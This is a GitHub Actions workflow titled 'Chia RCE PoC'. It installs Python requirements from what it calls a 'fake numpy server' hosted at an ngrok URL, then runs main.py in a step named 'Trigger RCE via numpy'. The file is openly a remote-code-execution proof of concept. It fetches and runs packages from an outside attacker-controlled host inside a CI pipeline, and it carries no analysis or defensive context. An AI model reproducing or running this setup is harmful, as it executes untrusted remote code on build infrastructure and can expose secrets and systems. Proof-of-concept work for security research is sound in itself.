name: Chia RCE PoC

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.10'

      - name: Install requirements from fake numpy server
        run: pip install --find-links https://1e85a02117d4.ngrok-free.app -r requirements.txt

      - name: Trigger RCE via numpy
        run: python3 main.py

